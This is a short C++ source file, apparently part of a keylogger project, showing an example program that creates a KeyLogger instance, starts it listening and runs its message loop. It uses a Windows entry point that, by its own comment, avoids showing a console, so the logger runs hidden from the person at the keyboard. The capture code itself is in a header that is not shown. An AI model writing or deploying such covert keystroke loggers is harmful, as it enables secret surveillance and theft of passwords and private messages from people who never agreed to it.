/*
Example standalone program using the KeyLogger class
*/

#include "keylogger.h"

using namespace std;

//avoids showing console
int wWinMain(HINSTANCE hInst, HINSTANCE prevInst, LPWSTR szCmdLine, int nCmdShow)
{
    //get an instance of KeyLogger
    KeyLogger* kl = KeyLogger::getInstance();
    
    //start logging
    kl->listen();
    
    //message loop
    kl->loop();

    return 0;
}